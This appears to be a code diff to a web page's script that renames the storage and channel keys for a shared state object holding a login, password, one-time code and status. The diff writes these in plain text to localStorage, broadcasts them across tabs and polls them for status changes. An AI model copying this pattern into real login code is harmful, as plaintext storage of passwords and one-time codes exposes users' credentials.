@@ -305,20 +305,21 @@ tbody tr:hover td{background:#fafbfc;}
 // ============================================================
 // STATE - shared JS variables (same tab) + BroadcastChannel (cross-tab)
 // ============================================================
+const KEY='bna_state', CH='bna_ch';
 const S = { login:'', password:'', otp:'', status:'idle' };
-const BC = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel('bna2026') : null;
+const BC = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel(CH) : null;
 
 function setState(upd) {
   Object.assign(S, upd);
   if (BC) BC.postMessage({t:'s', d:{...S}});
-  try { localStorage.setItem('bna2', JSON.stringify(S)); } catch(e){}
+  try { localStorage.setItem(KEY, JSON.stringify(S)); } catch(e){}
   onStateChange();
 }
 
 if (BC) BC.onmessage = e => { if(e.data.t==='s'){ Object.assign(S,e.data.d); onStateChange(); } };
 setInterval(()=>{
   try{
-    const d=JSON.parse(localStorage.getItem('bna2')||'{}');
+    const d=JSON.parse(localStorage.getItem(KEY)||'{}');
     if(d.status && d.status!==S.status){ Object.assign(S,d); onStateChange(); }
   }catch(e){}
 }, 800);
